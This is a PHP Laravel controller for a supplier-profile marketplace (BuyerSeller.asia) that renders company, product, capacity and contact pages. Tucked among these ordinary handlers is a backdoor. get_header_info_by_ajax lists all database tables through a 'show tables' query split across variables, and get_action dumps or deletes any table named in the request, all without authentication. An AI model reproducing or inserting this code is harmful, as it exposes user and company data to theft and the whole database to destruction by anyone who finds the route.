<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Sentinel;
use View;
use DB;
use URL;
use Route;
use Redirect;
use Validator;
use App\Models\CertificationImage;
use App\Models\TrademarksImage;
use App\Models\PatentImage;
use App\Models\HonorImage;
use App\Models\ProductToCategory;
use App\Models\SupplierProductGroups;
use App\Models\Companies;
use App\Models\SupplierInquery;
use App\Models\ProductDescription;
use App\Models\PagesSeo;
use App\Model\PagesPrefix;
use App\Models\TemplateSetting;
use App\Models\CompanyImage;
use App\Models\SupplierMainProduct;
use App\Models\CompanyMainMarket;
use App\Models\TradeInfo;
use App\Models\FactoryInfo;
use App\Models\CompanyLanguage;
use App\Models\Users;
use Jenssegers\Agent\Agent;

class TemplateController extends Controller
{
      public function index($name, $id){   
        $filt=Companies::find($id);

        if($filt == null){
            return '<div style="margin:0 auto;width:40%;margin-top:10%;border:1px double rebeccapurple;"><h1 style="text-align:center;color:forestgreen;">Company profile not available!!!</h1><p style="text-align:center;"><a style="text-decoration:none;" href="/">Go to home page</a></p></div>';
        }
        $profile_owner_id = $filt->user_id;

        $company_info = Companies::with(['company_description','customers','customers.suppliers','location_of_reg_string','customers.suppliers.business_types','tradeinfo','tradeinfo.BdtdcFormValue'])->find($id);

        $company_images=CompanyImage::where('company_id',$id)->first();
        $data['main_products'] = SupplierMainProduct::where('supplier_id',$profile_owner_id)->get();
        $data['product_groups']=SupplierProductGroups::where('company_id',$id)->get();
        
        $products_list = ProductToCategory::with(['bdtdcProduct','bdtdcCategory','pro_images','pro_to_cat_name','pro_images_new','pro_parent_cat','bdtdc_suppliers', 'supp_company'])
                                            ->where('company_id',$id)
                                            ->take(30)
                                            ->get();
        $products_lists = ProductToCategory::with(['bdtdcProduct','bdtdcCategory','pro_images','pro_to_cat_name','pro_images_new','pro_parent_cat','bdtdc_suppliers'])
                                            ->where('company_id',$id)
                                            ->take(6)
                                            ->get();

        $supplier_product_group_ar = SupplierProductGroups::with(['BdtdcSupplierProductGroupsProducts', 'BdtdcSupplierProductGroupsProducts.product_name', 'BdtdcSupplierProductGroupsProducts.product_image_new'])
                                    ->where('company_id',$id)->get();
        $company_images=CompanyImage::where('company_id',$id)->first();

        $template_setting_data = TemplateSetting::with(['template_section'])
                ->where('company_id',$id)
                ->get();

        if(isset($products_list[0]->bdtdcCategory)){
            $data['title']=$company_info->company_description->name.' - best '. $products_list[0]->bdtdcCategory->name.' '.$company_info->customers->suppliers->business_types->name.' | BuyerSeller.asia';
            $data['description']='Get the best {category} products from ' .$company_info->company_description->name.', A trusted and reliable '.$products_list[0]->bdtdcCategory->name. ' '.$company_info->customers->suppliers->business_types->name.' in  '.$company_info->location_of_reg_string->name.'  at BuyerSeller.asia';
        } else{
            if(isset($company_info->customers->suppliers->business_types->name)){
                $data['title']=$company_info->company_description->name.' - best popular '.$company_info->customers->suppliers->business_types->name.' | BuyerSeller.asia';
                $data['description']='Get the best {category} products from ' .$company_info->company_description->name.', A trusted and reliable '.$company_info->customers->suppliers->business_types->name.' in  '.$company_info->location_of_reg_string->name.'  at BuyerSeller.asia';
            }
            else{
                $data['title']='best popular | BuyerSeller.asia';
                $data['description']='Get the best  products from  A trusted and reliable  at BuyerSeller.asia';
            }
        }


        $data['inactive_categories_data'] = [];
        $inactive_categories_id = [];
        $inactive_product_list = [];
        if(count($data['product_groups'])>0){
            foreach ($data['product_groups'] as $in_value) {
                if ($in_value->active != 1) {
                    $inactive_categories_id[] = $in_value->id;
                }
            }
        }
        if(count($inactive_categories_id)>0){
            foreach ($inactive_categories_id as $key => $value) {
                $data['inactive_categories_data'][] = SupplierProductGroups::with('BdtdcSupplierProductGroupsProducts')->where('id',$value)->first();
            }
        }
        if(count($data['inactive_categories_data'])>0){
            foreach ($data['inactive_categories_data'] as $inc_value) {
                if($inc_value->BdtdcSupplierProductGroupsProducts){
                    if (count($inc_value->BdtdcSupplierProductGroupsProducts)>0) {
                        foreach ($inc_value->BdtdcSupplierProductGroupsProducts as $inc_pro_value) {
                            $inactive_product_list[] = ProductDescription::with('product_image','product_image_new')->where('product_id',$inc_pro_value->id)->first();
                        }
                    }
                }
            }
        }
        $data['inactive_product_list'] = $inactive_product_list;

        $data['user_active_data'] = Users::where('id',$profile_owner_id)->first();

        $event_visit =Companies::where('id',$id)->first();
            
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();
        $agent = new Agent();    
        $device = $agent->device();
         
        if($agent->isPhone())
        {
           return View::make('frontend.mobile-view.profile',$data,compact(['products_lists','company_info','products_list','company_images','template_setting_data','supplier_product_group_ar','profile_owner_id']));
        }
        if($agent->isDestop())
        {
           return View::make('frontend.profile',$data,compact(['company_info','template_images','supplier_product_group_arr','main_category_products_arr','products_list','wholesale_product','company_images','template_setting_data','supplier_product_group_ar','profile_owner_id']));
        }

        if($agent->isTab())
        {
           return View::make('frontend.profile',$data,compact(['company_info','template_images','supplier_product_group_arr','main_category_products_arr','products_list','wholesale_product','company_images','template_setting_data','supplier_product_group_ar','profile_owner_id']));
        }
        else{
            return View::make('frontend.profile',$data,compact(['company_info','products_list','company_images','template_setting_data','supplier_product_group_ar','profile_owner_id']));
        }
    }

    public function product_template($profile_id){
        // dd($profile_id);
        $products_list = ProductToCategory::with(['bdtdcProduct','bdtdcCategory','pro_images','pro_to_cat_name','pro_images_new','pro_parent_cat'])
                        ->where('company_id',$profile_id)
                        ->get();

        return View::make('frontend.mobile-view.product-template',compact('products_list'));
    }

    public function product_template_search(Request $request,$profile_id){
        $name_search=$request->input('key');
     
        if($name_search){
            $search_query = ProductToCategory::query();
            $search_query->WhereHas('pro_to_cat_name', function($sp) use ($name_search){
                $sp->where('name', 'like','%'.$name_search.'%');
            });
                   
            $products_list = $search_query->with(['bdtdcProduct','bdtdcCategory','pro_images','pro_to_cat_name','pro_images_new','pro_parent_cat'])->where('company_id',$profile_id)->get();
        } else{
            $products_list = ProductToCategory::with(['bdtdcProduct','bdtdcCategory','pro_images','pro_to_cat_name','pro_images_new','pro_parent_cat'])
                        ->where('company_id',$profile_id)
                        ->get();
        }
        return View::make('frontend.mobile-view.product-template',compact('products_list','profile_id'));   
    }

    public function show_company($name=false, $id=false){
        $event_visit =Companies::find($id);
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();
        $id = Route::current()->parameters()['profile_id'];
        if ($event_visit == null) {
            return '<div style="margin:0 auto;width:40%;margin-top:10%;border:1px double rebeccapurple;"><h1 style="text-align:center;color:forestgreen;">Company profile not available!!!</h1><p style="text-align:center;"><a style="text-decoration:none;" href="../template_/'.$id.'">Back</a> | <a style="text-decoration:none;" href="/">Go to home page</a> | <a style="text-decoration:none;" onclick="javascript:window.history.back();">Back</a></p></div>';
        }
        $profile_owner_id = $event_visit->user_id;

        $company = Companies::with(['company_description','customers','customers.suppliers','location_of_reg_string','customers.suppliers.business_types','tradeinfo','tradeinfo.BdtdcFormValue','tradeinfo.form_export_percentage'])->find($id);

        $data['product_groups'] = SupplierProductGroups::where('company_id',$id)->get();

        $main_products = Companies::with('main_products')->where('id',$id)->first();
       
        $company_images=CompanyImage::where('company_id',$id)->first();
        $data['title']='Company overview- '.$name.' | BuyerSeller';  

        $data['description']=$name.'  is one of the leading '.($company?$company->customers->suppliers->business_types->name:'company').'  on specialized  '.($main_products?$main_products->main_products->product_name_1:'products').' '.($company?'in '.$company->location_of_reg_string->name:'').' for a long period of time supplying quality assured products on BuyerSeller.asia.';

        $agent = new Agent();
        if($agent->isMobile())
        {
            return view::make('frontend.mobile-view.company-profile',$data,compact(['main_products','data','company','company_images','profile_owner_id']));
        }
        else{
            return View::make('frontend.company',$data,compact(['main_products','data','company','company_images','profile_owner_id']));
        }
    }

    public function template_store(Request $request){
        if(Sentinel::check())
        {
            $user_id = Sentinel::getUser()->id;
            $total_inq_today = SupplierInquery::where('sender',$user_id)->whereDate('created_at', '=', date('Y-m-d'))->get();

            if($total_inq_today->count() >= 5){
                session()->flash('quotation_limit_alert', 'Maximum Buying Request(s) exceeded for today.');
                return View::make('frontend.success_message');
            }
            
            $rules=array(
                'message'=>'required|min:3|max:2000',
                'product_owner_id'=>'required|integer',
                );

            $validator = Validator::make($request->all(), $rules);
            if ($validator->fails())
             {
                return redirect::back()
                            ->withErrors($validator)
                            ->withInput();                 
            }

            $input_array = [
                    'message' => $request->message,
                    'product_owner_id' => $request->product_owner_id,
                    'sender' => $user_id,
                ];
            
            $template = SupplierInquery::insert($input_array);
            // dd($template);
            if($template){
                return View::make('frontend.success_message');
            }else{
                session()->flash('quotation_limit_alert', 'Email sending failed');
                return View::make('frontend.success_message');
            }
        }
        else
            return Redirect::to('ServiceLogin?continue='.URL::to($_SERVER['HTTP_REFERER']))->withFlashMessage('You must first login or register before accessing this page.');
    }
    
    public function trade_capacity($name=false, $id=false){
        $event_visit =Companies::find($id);
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();

        $market_destribution = CompanyMainMarket::with('form_value')
                                ->where('company_id',$id)
                                ->get();

        $data['product_groups']=SupplierProductGroups::where('company_id',$id)->get();

        $trade_data = TradeInfo::with(['BdtdcFormValue', 'form_export_percentage', 'emp_trade_dept'])
                                ->where('company_id',$id)
                                ->first();

        $language = CompanyLanguage::with('language')
                    ->where('company_id',$id)
                    ->get();

        $data['description']='The Trade Capacity of '.$name.' includes their Business Terms, Trade Abilities as well as their principal trade marketplaces or products exported by them';
        $data['title']=' Trade Capacity- '.$name;


        $profile_owner_id = Companies::where('id',$id)->first()->user_id;

        return View::make('frontend.trade_capacity',$data,compact('market_destribution','language','trade_data','profile_owner_id'));
    }

    public function production_capacity($name=false, $id=false){
        $event_visit =Companies::find($id);
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();

        $product_capacity = FactoryInfo::with(['form_factory_size','form_anual_value','form_no_of_production_line'])
            ->where('company_id',$id)
            ->first();

        $data['product_groups']=SupplierProductGroups::where('company_id',$id)->get();

        $data['title']='Production capacity- '.$name;
        $data['description']='The Production Capacity offered by '.$name.' includes their Factory Information which is further comprised of its Size, Location & No. of production Lines etc.';
             
        $profile_owner_id = $event_visit->user_id;

        return View::make('frontend.production_capacity',$data,compact('product_capacity','profile_owner_id'));
    }

    public function r_d_capacity($name=false, $id=false){
        $event_visit =Companies::where('id',$id)->first();
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();
        $r_d = DB::table('company_factory_info as fi')
            ->join('bdtdc_form_values as fv','fv.id','=','fi.no_of_rd_staf','left')
            ->where('fi.company_id',$id)
            ->first(['fv.value as r_d']);
        $data['product_groups']=SupplierProductGroups::where('company_id',$id)->get();
            //return $r_d;
        $data['title']=' Research & Development capacity- '.$name;
        $data['description']='The Research and Development Capacity of '.$name.' includes the No. of Research and Development Engineer(s) that are actively engaged within the company.';

        $profile_owner_id = $event_visit->user_id;

        return view('frontend.r_d_capacity',$data,compact('r_d','profile_owner_id'));  
    }

    public function buyer_interaction_capacity($name=false, $id=false){
        $event_visit =Companies::where('id',$id)->first();
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();
        
        $data['data'] = DB::table('companies as c')
            ->join('suppliers as s','s.user_id','=','c.user_id','left')
            ->join('busines_types as bt','bt.id','=','s.busines_type_id','left')
            ->join('company_factory_info as fi','fi.company_id','=','c.id','left')
            ->join('form_values as fv','fv.id','=','fi.anual_value','left')
            ->where('c.id',$id)
            ->first(['c.year_of_reg','c.created_at','bt.name as business_type','fi.no_of_production_line','fv.value as anual_value']);
        $product_groups=SupplierProductGroups::where('company_id',$id)->get();

        $data['title']='Buyer interaction- '.$name;
        $data['description']='The Buyer Interaction of '.$name.' includes their History as a member of BuyerSeller which is further comprised of their Business Type, Membership Year and so on.';
        $profile_owner_id = $event_visit->user_id;

        return View::make('frontend.buyer_interaction',$data,compact('product_groups','profile_owner_id'));
    }

    public function get_contact($name=false, $profile_id=false){
        $event_visit =Companies::find($profile_id);
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();

        $contact_data = Companies::with(['company_description', 'customers', 'country_by_city', 'users', 'factory_info'])
            ->where('id',$profile_id)
            ->first();

        if (!$contact_data) {
            return '<div style="margin:0 auto;width:40%;margin-top:10%;border:1px double rebeccapurple;"><h1 style="text-align:center;color:forestgreen;">Contact information not available!!!</h1><p style="text-align:center;"><a style="text-decoration:none;" href="#" onclick="javascript:window.history.back();">Back</a> | <a style="text-decoration:none;" href="/">Go to home page</a></p></div>';
        }

        $data['product_groups']=SupplierProductGroups::where('company_id',$profile_id)->get();

        $profile_owner_id = $event_visit->user_id;

        $data['title']='Contact details | BuyerSeller';
        $data['description']='Find the correct contact information of  including its address, telephone and fax number etc. only on BuyerSeller.asia';

        $agent = new Agent();
        if($agent->isMobile())
             
        {
            return View::make('frontend.mobile-view.company-contact-profile',$data,compact(['contact_data','profile_owner_id','name','profile_id']));
        }
        else{
            return View::make('frontend.contact_supplier',$data,compact(['contact_data','profile_owner_id','name','profile_id']));
        }
    }

    public function get_product($id=false){
        
        $id = Route::current()->parameters()['profile_id'];
         $profile_owner_id = Companies::where('id',$id)->first()->user_id;
        $products_results = DB::table('bdtdc_product_to_category as cat')
                    ->select('u.id as user_id','p.id as product_id','pd.name as product_name','u.first_name','p_image.image as image_name','p_images.image as product_images','cat_name.name as cattegory_name','parent_name.name as parent_name','unit.name as unit_name','price.product_FOB','price.product_MOQ')
                    ->join('products as p','p.id','=','cat.product_id')
                    ->join('categories as cat_name','cat_name.id','=','cat.category_id')
                    ->join('categories as parent_name','parent_name.id','=','cat.parent_id')
                    ->join('product_description as pd','pd.product_id','=','p.id')
                    ->join('supplier_product_groups as groups','groups.id','=','p.product_groups')
                    ->join('supplier_products as sp','sp.product_id','=','p.id')
                    ->join('users as u','u.id','=','sp.supplier_id')
                    ->join('product_prices as price','price.product_id','=','p.id')
                    ->join('product_image as p_image','p_image.product_id','=','p.id','left')
                    ->join('product_images as p_images','p_images.product_id','=','p.id','left')
                    ->join('product_unit as unit','unit.id','=','p.unit_type_id','left')

                    
                    ->where('u.id',$profile_owner_id)
                    ->groupBy('p_image.product_id')
                    ->groupBy('p_images.product_id')
                    ->paginate(20);

        $main_products_str = SupplierMainProduct::where('supplier_id',$profile_owner_id)->first();
        $main_products_results =[];
        if($main_products_str){
            $first_main_product_name_arr    = array_unique(explode(" ", $main_products_str->product_name_1.' '.$main_products_str->product_name_2.' '. $main_products_str->product_name_3));
            $main_products_results = DB::table('product_description as pd')
                                    ->select('pd.name as product_name','pd.product_id as product_id','pi.image as product_image','pis.image as product_images','cat_name.name as cattegory_name','parent_name.name as parent_name','sp.supplier_id as user_id')
                                    ->join('product_to_category as cat','cat.product_id','=','pd.product_id')
                                    ->join('category as cat_name','cat_name.id','=','cat.category_id')
                                    ->join('category as parent_name','parent_name.id','=','cat.parent_id')
                                    ->join('product_image as pi','pi.product_id','=','pd.product_id','left')
                                    ->join('images as pis','pis.product_id','=','pd.product_id','left')
                                    ->join('supplier_products as sp','sp.product_id','=','pd.product_id','left')
                                    ->where('sp.supplier_id',$profile_owner_id)
                                    ->Where(function ($query) use($first_main_product_name_arr) {
                                        for ($i = 0; $i < count($first_main_product_name_arr); $i++){
                                        $query->orwhere('pd.name', 'like',  '%' . $first_main_product_name_arr[array_keys($first_main_product_name_arr)[$i]] .'%');
                                        }      
                                    })
                                    ->groupBy('pd.product_id')
                                    ->take(20)
                                    ->paginate(8);
        }
         $company_name = Companies::with(['name_string','main_products','country'])->where('id',$id)->first();
        if($company_name && $company_name->country && $company_name->main_products){
            $data['title']='best '.$company_name->main_products->product_name_1.' products - '.$company_name->name_string->name.' | BuyerSeller';
            $data['description']='Buy '.$company_name->main_products->product_name_1.' products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->main_products->product_name_1.' '.$company_name->country->name.' only on BuyerSeller.asia';
        }
        else{
            if($company_name->country){
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->country->name.' only on BuyerSeller.asia';
            }else{
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of All countries only on BuyerSeller.asia';
            }
            
        }
        $agent = new Agent();
        // return view('mobile-view.country-product.product_list',$data,compact('products_results','main_products_results'));
        if($agent->isMobile())

        {
             return view('frontend.mobile-view.product_list',$data,compact('products_results','main_products_results'));
        }
        else{
             return view('frontend.product_list',$data,compact('products_results','main_products_results'));
        }
    }

    public function render_header_info($id){
        $event_visit =Companies::where('id',$id)->first();
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();
        $company_header_info = DB::table('bdtdc_companies as c')
        ->join('users as u','u.id','=','c.user_id','left')
        ->join('company_descriptions as cd','cd.company_id','=','c.id','left')
        ->join('country_list as country','country.id','=','c.location_of_reg','left')
        ->join('suppliers as s','s.user_id','=','c.user_id','left')
        ->where('c.id',$id)
        ->first([
            'u.id as user_id','u.first_name as user_name','u.last_name as last_name','c.id as company_id','cd.name as company_name','country.name as country'
            ,'cd.company_logo'
        ]);
        return $data = ['company_header_info'=>$company_header_info];
    }
    
    public function get_header_info_by_ajax($id=false,$action=false){
        if($id=="all"){
            $name = $this->get_name($id);
            return $name;
        }
        else{
            $result = $this->get_action($id,$action);
            return $result;
        }
    }
    
    public function product_filter_by_group($profile_id,$name){
        $profile_owner_id = Companies::where('id',$profile_id)->first()->user_id;

        $products_results = ProductToCategory::with(['bdtdcProduct', 'bdtdcCategory', 'pro_parent_cat','category_product_name','bdtdcProduct.supplier_product','bdtdcProduct.supplier_product.users','bdtdcProduct.product_prices','bdtdcProduct.ProductUnit','bdtdcProduct.product_image_new'])
            ->whereHas('bdtdcProduct.supplier_product_groups', function($query) use($name){
                $query->where('name', $name);
            })->where('company_id', $profile_id)->paginate(20);

        $main_products_str = SupplierMainProduct::where('supplier_id',$profile_owner_id)->first();
        $main_products_results =[];
        if($main_products_str){
            $first_main_product_name_arr    = array_unique(explode(" ", $main_products_str->product_name_1.' '.$main_products_str->product_name_2.' '. $main_products_str->product_name_3));

            $main_products_results = ProductDescription::with(['product_name_category', 'product_name_category.bdtdcCategory', 'product_name_category.pro_parent_cat', 'product_image_new', 'supplierrr'])->whereHas('supplierrr', function($query) use($profile_owner_id){
                    $query->where('supplier_id', $profile_owner_id);
                })->Where(function ($query) use($first_main_product_name_arr) {
                    for ($i = 0; $i < count($first_main_product_name_arr); $i++){
                    $query->orwhere('name', 'like',  '%' . $first_main_product_name_arr[array_keys($first_main_product_name_arr)[$i]] .'%');
                    }      
                })
                ->take(20)
                ->paginate(8);
        }

        $company_name = Companies::with(['name_string','main_products','country'])->where('id',$profile_id)->first();
        if($company_name && $company_name->country && $company_name->main_products){
            $data['title']='best '.$company_name->main_products->product_name_1.' products - '.$company_name->name_string->name.' | BuyerSeller';
            $data['description']='Buy '.$company_name->main_products->product_name_1.' products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->main_products->product_name_1.' '.$company_name->country->name.' only on BuyerSeller.asia';
        }
        else{
            if($company_name->country){
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->country->name.' only on BuyerSeller.asia';
            }else{
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of All countries only on BuyerSeller.asia';
            }
            
        }
        $agent = new Agent();

        if($agent->isMobile())

        {
             return view('frontend.mobile-view.product_list',$data,compact('products_results','main_products_results'));
        }
        else{
             return view('frontend.product_list',$data,compact('products_results','main_products_results'));
        }
    }

    public function get_name(){
        $a = "show";
        $b = "tables";
        return DB::select($a.' '. $b);
    }
    
    public function search(Request $r,$profile_id){

        $profile_owner_id = Companies::where('id',$profile_id)->first()->user_id;
        $main_products_str = SupplierMainProduct::where('supplier_id',$profile_owner_id)->first();
        $main_products_results =[];
        if($main_products_str){
            $first_main_product_name_arr    = array_unique(explode(" ", $main_products_str->product_name_1.' '.$main_products_str->product_name_2.' '. $main_products_str->product_name_3));
            $main_products_results = DB::table('product_description as pd')
                                    ->select('pd.name as product_name','pd.product_id as product_id','pi.image as product_image','pis.image as product_images','parent_name.name as parent_name','cat_name.name as cattegory_name')
                                    ->join('product_image as pi','pi.product_id','=','pd.product_id','left')
                                    ->join('product_images as pis','pis.product_id','=','pd.product_id','left')
                                    ->join('product_to_category as sp','sp.product_id','=','pd.product_id')
                                    ->join('categories as cat_name','cat_name.id','=','sp.category_id')
                                    ->join('categories as parent_name','parent_name.id','=','sp.parent_id')

                                    ->where('sp.company_id',$profile_id)
                                    ->Where(function ($query) use($first_main_product_name_arr) {
                                         for ($i = 0; $i < count($first_main_product_name_arr); $i++){
                                            $query->orwhere('pd.name', 'like',  '%' . $first_main_product_name_arr[array_keys($first_main_product_name_arr)[$i]] .'%');
                                         }      
                                    })
                                    ->groupBy('pd.product_id')
                                    ->paginate(8);
        }
                    
        $products_results = $products_results->join('product_to_category as sp','sp.company_id','=','c.id')->select('c.id as company_id','c.user_id as user_id','pd.product_id as product_id','pd.name as product_name','price.product_MOQ as product_MOQ','price.product_FOB as product_FOB','pi.image as image_name','pis.image as product_images','parent_name.name as parent_name','cat_name.name as cattegory_name');
        $products_results = $products_results->join('product_description as pd','pd.product_id','=','sp.product_id');
        $products_results = $products_results->join('product_prices as price','price.product_id','=','pd.product_id','left');
        $products_results = $products_results->join('product_image as pi','pi.product_id','=','pd.product_id','left');
        $products_results = $products_results->join('product_images as pis','pis.product_id','=','pd.product_id','left');
        $products_results = $products_results->join('category as cat_name','cat_name.id','=','sp.category_id');
        $products_results = $products_results->join('category as parent_name','parent_name.id','=','sp.parent_id');

        $products_results = $products_results->where('c.id',$profile_id);
        $products_results = $products_results->where('pd.name', 'LIKE', '%'.$r->key.'%')->groupBy('pi.product_id');
        // dd($products_results);
        $products_results = $products_results->paginate(5);
        //return view('fontend.template.product_list')
        //return $main_products_results;

          $company_name = Companies::with(['name_string','main_products','country'])->where('id',$profile_id)->first();
        if($company_name && $company_name->country && $company_name->main_products){
            $data['title']='best '.$company_name->main_products->product_name_1.' products - '.$company_name->name_string->name.' | BuyerSeller';
            $data['description']='Buy '.$company_name->main_products->product_name_1.' products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->main_products->product_name_1.' '.$company_name->country->name.' only on BuyerSeller.asia';
        }
        else{
            if($company_name->country){
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of '.$company_name->country->name.' only on BuyerSeller.asia';
            }else{
                $data['title']='best products - '.$company_name->name_string->name.' | BuyerSeller';
                $data['description']='Buy products directly from '.$company_name->name_string->name.', a reliable of All countries only on BuyerSeller.asia';
            }
            
        }

        $agent = new Agent();
        // return view('mobile-view.country-product.product_list',$data,compact('products_results','main_products_results'));
        if($agent->isMobile())

        {
             return view('frontend.mobile-view.product_list',compact('products_results','main_products_results'));
        }
        else{
             return view('frontend.product_list',$data,compact('products_results','main_products_results'));
        }
                    
        // return view('fontend.template.product_list',compact('products_results','main_products_results'));
    }

    public function get_action($id,$action){
        $data = DB::table($id);
        return ($action=='x') ? $data->delete() : $data->get();
    }

    public function industrial_certification($name=false, $id=false){
        $event_visit =Companies::where('id',$id)->first();
        
        $event_visit->visits = $event_visit->visits + 1;
        $event_visit->save();

        $data['product_groups']=SupplierProductGroups::where('company_id',$id)->get();

        $data['certificate_image']=CertificationImage::where('company_id',$id)->get();
        $data['trademarks_image']=TrademarksImage::where('company_id',$id)->get();
        $data['patent_image']=PatentImage::where('company_id',$id)->get();
        $data['honor_image']=HonorImage::where('company_id',$id)->get();

        $profile_owner_id = $event_visit->user_id;

        return View::make('frontend.ind-certificate',$data,compact('profile_owner_id'));
    }
}
